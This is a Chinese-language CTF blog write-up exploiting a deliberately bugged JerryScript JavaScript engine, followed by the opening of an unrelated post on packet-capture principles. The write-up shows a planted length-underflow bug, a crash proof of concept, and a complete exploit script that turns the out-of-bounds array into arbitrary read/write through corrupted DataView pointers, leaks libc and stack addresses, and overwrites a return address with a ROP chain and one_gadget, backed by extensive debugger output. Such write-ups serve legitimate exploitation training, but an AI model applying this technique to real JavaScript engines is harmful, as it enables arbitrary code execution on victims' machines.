<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_extended_object_t</span> extended_object; <span class="comment">/* 扩展对象部分 */</span></span><br><span class="line">  <span class="keyword">void</span> *buffer_p; <span class="comment">/* 指向数组缓冲区对象的后备存储的指针 */</span></span><br><span class="line">  <span class="keyword">void</span> *arraybuffer_user_p; <span class="comment">/* 传递给免费回调的用户指针 */</span></span><br><span class="line">&#125; <span class="keyword">ecma_arraybuffer_pointer_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_extended_object_t</span> header; <span class="comment">/* 头部分 */</span></span><br><span class="line">  <span class="keyword">ecma_object_t</span> *buffer_p; <span class="comment">/* [ViewedArrayBuffer]内部槽 */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> byte_offset; <span class="comment">/* [ByteOffset]内部槽 */</span></span><br><span class="line">&#125; <span class="keyword">ecma_dataview_object_t</span>;</span><br></pre></td></tr></table></figure>
<p>ArrayBuffer 和 DataView 这两个对象在 JavaScript 引擎漏洞挖掘中经常出现</p>
<p>这里，我们注意到：</p>
<ul>
<li>ArrayBuffer 的结构体存在 <code>buffer_p</code> 这样的一个指针，它直接指向了 ArrayBuffer 所控制的内存区域（而不是像其他对象那样，通过偏移计算来得到所控制的内存区域）</li>
<li>DataView 的结构体中，<code>buffer_p</code> 则是指向 <code>ArrayBuffer-&gt;buffer_p</code></li>
</ul>
<p><strong>Array Out-Of-Boundary（数组越界）</strong></p>
<p>数组索引的边界检查是防止数组访问越界的有效手段，但是对数组索引的边界检查是比较耗时的，因此 JIT 引擎为了提高 Javascript 代码运行效率，对数组的边界检查在一定条件下进行了优化 </p>
<p>Bound Check Optimize（边界检查优化）主要分为 Bound Check Elimination（绑定检查消除）和 Bound Check Hoist（绑定检查提升）两部分，错误的 Elimination 或者 Hoist 都会引发 Array Out-Of-Boundary (OOB) 漏洞 </p>
<p>我们现在回到程序的漏洞点：</p>
<ul>
<li><code>ecma_delete_fast_array_properties</code> 的第二个参数改为 <code>len - 2</code></li>
<li>如果 <code>len</code> 的值为 “1”，就会被减为 “-1”，发生符号溢出</li>
</ul>
<p>案例如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>]; <span class="comment">/* len=1 */</span></span><br><span class="line">a.pop(); <span class="comment">/* 触发ecma_delete_fast_array_properties,导致len=-1 */</span></span><br><span class="line">print(a.length);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn ./jerry ./pwn2.js </span><br><span class="line"><span class="number">4294967295</span> <span class="comment">/* 0xffffffff -&gt; len=-1 */</span></span><br><span class="line">[<span class="number">1</span>]    <span class="number">9011</span> segmentation fault  ./jerry ./pwn2.js</span><br></pre></td></tr></table></figure>
<ul>
<li>触发 Array OOB </li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187739">Chakra漏洞调试笔记4——Array OOB</a> </p>
<p><strong>入侵思路</strong></p>
<p>完整的 exp 如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span>&#123;<span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aar</span>(<span class="params">addr, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(dv2.buffer)&#123;</span><br><span class="line">        <span class="keyword">return</span> dv2.getBigUint64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaw</span>(<span class="params">addr, value, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>);</span><br><span class="line">    dv2.setBigUint64(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">0x31</span>];</span><br><span class="line">a1 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">d1 = <span class="keyword">new</span> <span class="built_in">DataView</span>(a1);</span><br><span class="line">d1.setUint32(<span class="number">0</span>, <span class="number">0x41414141</span>, <span class="literal">true</span>);</span><br><span class="line">a2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">d2 = <span class="keyword">new</span> <span class="built_in">DataView</span>(a2);</span><br><span class="line">d2.setUint32(<span class="number">0</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);</span><br><span class="line">a.pop();</span><br><span class="line">a[<span class="number">0x2c</span>] = <span class="number">0x5562526</span>;</span><br><span class="line">puts_got            = <span class="built_in">Number</span>(aar(<span class="number">0x555555621e08</span>, d1, d2));</span><br><span class="line">libc_base           = puts_got - <span class="number">0x84420</span>;</span><br><span class="line">environ             = libc_base + <span class="number">0x1ef600</span>;</span><br><span class="line">stack               = <span class="built_in">Number</span>(aar(environ, d1, d2));</span><br><span class="line">libc_start_main_ret = stack - <span class="number">0x108</span>;</span><br><span class="line">libc_start_main     = <span class="built_in">Number</span>(aar(libc_start_main_ret, d1, d2));</span><br><span class="line">aaw(libc_start_main_ret, <span class="number">0x555555554000</span> + <span class="number">0xa9a9</span>, d1, d2);  <span class="comment">// pop r12, rbp</span></span><br><span class="line">aaw(libc_start_main_ret + <span class="number">8</span>, <span class="number">0</span>, d1, d2);</span><br><span class="line">aaw(libc_start_main_ret + <span class="number">16</span>, <span class="number">0</span>, d1, d2);</span><br><span class="line">aaw(libc_start_main_ret + <span class="number">24</span>, libc_base + <span class="number">0xe3afe</span>, d1, d2);  <span class="comment">// one_gadget</span></span><br><span class="line">print(hex(puts_got));</span><br><span class="line">print(hex(libc_base));</span><br><span class="line">print(hex(stack));</span><br><span class="line">print(hex(libc_start_main));</span><br><span class="line">print(hex(<span class="built_in">Number</span>(aar(<span class="number">0x555555624000</span>, d1, d2))));</span><br></pre></td></tr></table></figure>
<ul>
<li>因为这些函数和变量都会改变堆布局，所以我直接调试 exp</li>
</ul>
<p>在 <code>ecma_builtin_array_prototype_object_pop</code>（710ab）打断点，然后使用 <code>p/x $rdi+0x10</code> 命令就可以把发生 OOB 的数组 <code>a</code> 给打印出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x $rdi+<span class="number">0x10</span></span><br><span class="line">$<span class="number">1</span> = <span class="number">0x555555624f80</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x555555624f80</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555555624f70</span>:	<span class="number">0x005e0064005e0014</span>	<span class="number">0x000000ecffffffff</span> <span class="comment">/* length */</span></span><br><span class="line"><span class="number">0x555555624f80</span>:	<span class="number">0x0025000000c80038</span>	<span class="number">0x0000000100200004</span></span><br><span class="line"><span class="number">0x555555624f90</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x42d5555558878200</span></span><br><span class="line"><span class="number">0x555555624fa0</span>:	<span class="number">0x0025006e00620018</span>	<span class="number">0x0000000100000012</span></span><br><span class="line"><span class="number">0x555555624fb0</span>:	<span class="number">0x000003c300587d37</span>	<span class="number">0x012f007200000343</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>property_list_cp</code> 和 <code>prototype_cp</code> 的值分为 <code>0x64</code> 和 <code>0x5e</code> </li>
</ul>
<p>然后在 <code>jerryx_print_value</code>（a5ae2）打断点，执行到 <code>print(a.length)</code> 前停下，打印两个 DataView 对象的位置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s AAAA</span><br><span class="line">[heap]          <span class="number">0x5555556257b0</span> <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x5555556257b0</span></span><br><span class="line">[heap]          <span class="number">0x555555625030</span> <span class="number">0x5555556257b0</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; search -s BBBB</span><br><span class="line">[heap]          <span class="number">0x5555556267b0</span> <span class="number">0x42424242</span> <span class="comment">/* &#x27;BBBB&#x27; */</span></span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x5555556267b0</span></span><br><span class="line">[heap]          <span class="number">0x555555625260</span> <span class="number">0x5555556267b0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>a1-&gt;buffer_p(0x5555556257b0)：AAAA</code></li>
<li><code>d1-&gt;buffer_p(0x555555625030)：0x5555556257b0</code></li>
<li><code>a2-&gt;buffer_p(0x5555556267b0)：BBBB</code></li>
<li><code>d2-&gt;buffer_p(0x555555625260)：0x5555556267b0</code></li>
</ul>
<p>如果我们想利用 <code>a</code> 的溢出点，必须先知道 <code>jerry_global_heap</code> 才能计算 <code>property_list_cp</code> ，而源程序没有符号表，我们只能通过对比源程序和我们自己编译的程序来获取这个值：（不知道的偏移都可以利用这个方法来解决）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555566a000</span>+<span class="number">0x17b0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555566b7b0</span> (jerry_global_heap+<span class="number">2896</span>) ◂— <span class="number">0x42424152</span> <span class="comment">/* &#x27;RABB&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555566b7b8</span> (jerry_global_heap+<span class="number">2904</span>) ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x55555566b7b0</span><span class="number">-2896</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555566ac60</span> (jerry_global_heap) ◂— <span class="number">0x8e8</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555566ac68</span> (jerry_global_heap+<span class="number">8</span>) ◂— <span class="number">0x20010800be0031</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555566ac70</span> (jerry_global_heap+<span class="number">16</span>) ◂— <span class="number">0x100000066</span> <span class="comment">/* &#x27;f&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624000</span>+<span class="number">0x17b0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5555556257b0</span> ◂— <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5555556257b8</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555556257b0</span><span class="number">-2896</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624c60</span> ◂— <span class="number">0x658</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624c68</span> ◂— <span class="number">0x2000d500be0031</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555555624c70</span> ◂— <span class="number">0x100000066</span> <span class="comment">/* &#x27;f&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>根据公式 <code>jerry_globals_heap + array-&gt;u1.property_list_cp &lt;&lt; 3</code> 进行计算：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">25</span>]: hex(<span class="number">0x555555624c60</span>+(<span class="number">0x64</span>&lt;&lt;<span class="number">3</span>))</span><br><span class="line">Out[<span class="number">25</span>]: <span class="string">&#x27;0x555555624f80&#x27;</span></span><br></pre></td></tr></table></figure>
<p>修改前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624f80</span> ◂— <span class="number">0x8800000310</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624f88</span> ◂— <span class="number">0x8800000088</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555555624fa0</span> ◂— <span class="number">0x25006e00620018</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x555555624fa8</span> ◂— <span class="number">0x100000012</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x555555624fb0</span> ◂— <span class="number">0x3c300587d37</span> <span class="comment">/* &#x27;7&#125;X&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x555555624fb8</span> ◂— <span class="number">0x12f007200000343</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x555555624fc0</span> ◂— <span class="number">0x20000000680011</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x555555624fc8</span> ◂— <span class="number">0x100000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x555555624fd0</span> ◂— <span class="number">0x10000078c8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x555555624fd8</span> ◂— <span class="number">0x10a01a900000363</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x555555624fe0</span> ◂— <span class="number">0xe40c292c0000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x555555624fe8</span> ◂— <span class="number">0x605040477616100</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x555555624ff0</span> ◂— <span class="number">0x1c24b8a70000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x555555624ff8</span> ◂— <span class="number">0x100f0e0e0d316101</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x555555625000</span> ◂— <span class="number">0x881d13e60000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x555555625008</span> ◂— <span class="number">0x1c1b1a1a19316401</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x555555625010</span> ◂— <span class="number">0xb400b20074008b</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x555555625018</span> ◂— <span class="number">0xd300d000cd0076</span> <span class="comment">/* &#x27;v&#x27; */</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x555555625020</span> ◂— <span class="number">0x6c0000006c0012</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x555555625028</span> ◂— <span class="number">0x100000000319</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x555555625030</span> —▸ <span class="number">0x5555556257b0</span> ◂— <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x555555625038</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624f80</span> ◂— <span class="number">0x25000000c80018</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624f88</span> ◂— <span class="number">0x100200004</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555555624f90</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x555555624f98</span> —▸ <span class="number">0x5555556253b8</span> —▸ <span class="number">0x555555625168</span> —▸ <span class="number">0x5555556253b0</span> —▸ <span class="number">0x5555556253c0</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555555624fa0</span> ◂— <span class="number">0x25006e00620018</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x555555624fa8</span> ◂— <span class="number">0x100000012</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x555555624fb0</span> ◂— <span class="number">0x3c300587d37</span> <span class="comment">/* &#x27;7&#125;X&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x555555624fb8</span> ◂— <span class="number">0x12f007200000343</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x555555624fc0</span> ◂— <span class="number">0x20000000680011</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x555555624fc8</span> ◂— <span class="number">0x100000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x555555624fd0</span> ◂— <span class="number">0x10000078c8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x555555624fd8</span> ◂— <span class="number">0x10a01a900000363</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x555555624fe0</span> ◂— <span class="number">0xe40c292c0000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x555555624fe8</span> ◂— <span class="number">0x605040477616100</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x555555624ff0</span> ◂— <span class="number">0x1c24b8a70000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x555555624ff8</span> ◂— <span class="number">0x100f0e0e0d316101</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x555555625000</span> ◂— <span class="number">0x881d13e60000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x555555625008</span> ◂— <span class="number">0x1c1b1a1a19316401</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x555555625010</span> ◂— <span class="number">0xb400b20074008b</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x555555625018</span> ◂— <span class="number">0xd300d000cd0076</span> <span class="comment">/* &#x27;v&#x27; */</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x555555625020</span> ◂— <span class="number">0x6c0000006c0012</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x555555625028</span> ◂— <span class="number">0x100000000319</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x555555625030</span> —▸ <span class="number">0x555555625260</span> —▸ <span class="number">0x7fffffffde60</span> —▸ <span class="number">0x7ffff7ea2afe</span> (execvpe+<span class="number">638</span>) ◂— mov    rdx, r12</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x555555625038</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>这个 <code>a[0x2c]</code> 对应的地址就是 <code>0x555555625030</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span>+<span class="number">0x4</span>*<span class="number">0x2c</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555625030</span> —▸ <span class="number">0x555555625260</span> —▸ <span class="number">0x7fffffffde60</span> —▸ <span class="number">0x7ffff7ea2afe</span> (execvpe+<span class="number">638</span>) ◂— mov    rdx, r12</span><br></pre></td></tr></table></figure>
<ul>
<li><code>0x5555556257b0</code>（<code>a1-&gt;buffer_p</code>）被修改为了 <code>0x555555625260</code>（<code>d2-&gt;buffer_p</code>）</li>
<li>这下 <code>a1-&gt;buffer_p</code> 和 <code>a2-&gt;buffer_p</code> 都指向 <code>d2-&gt;buffer_p</code>，就可以实现 WAA 和 RAA 了</li>
</ul>
<p>最后的问题就是 WAA 和 RAA 的实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aar</span>(<span class="params">addr, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>); <span class="comment">/* 先写入一个地址 */</span></span><br><span class="line">    <span class="keyword">if</span>(dv2.buffer)&#123;</span><br><span class="line">        <span class="keyword">return</span> dv2.getBigUint64(<span class="number">0</span>, <span class="literal">true</span>); <span class="comment">/* 返回该地址中的数据 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaw</span>(<span class="params">addr, value, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>); <span class="comment">/* 先写入一个地址 */</span></span><br><span class="line">    dv2.setBigUint64(<span class="number">0</span>, value, <span class="literal">true</span>); <span class="comment">/* 再向这个地址中写入数据 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后就是用 WWR 从 <code>environ</code> 中读出栈地址，然后在 <code>libc_start_main</code> 的返回值上构造 ROP 链，最后执行 one_gadget</p>
<p>PS：在交互时需要把 <code>\n</code> 去掉，还有注释也要去掉 </p>
<p><strong>小结：</strong></p>
<p>调了好多天终于弄好了，现在对这种 JavaScript 引擎的题目应该是有所了解了，主要就是靠 ArrayBuffer 和 DataView 这两个函数</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">网络相关知识：网络抓包原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-19 10:51:24 / Modified: 10:53:35" itemprop="dateCreated datePublished" datetime="2022-08-19T10:51:24+08:00">2022-08-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>556</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="手机-App-抓包"><a href="#手机-App-抓包" class="headerlink" title="手机 App 抓包"></a>手机 App 抓包</h2><p>要实现对 App 的网络数据抓包，需要监控 App 与服务器交互之间的网络节点，监控其中任意一个网络节点（网卡），获取所有经过网卡中的数据，对这些数据按照网络协议进行解析，这就是抓包的基本原理</p>
<p>但是中间网络节点，不受我们控制，所以基本无法实现抓包的，只能在客户端和服务端进行抓包</p>
<p>通常我们监控本地网卡数据，如下图： </p>
<img src="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/1660838000697.png" class width="1660838000697"> 
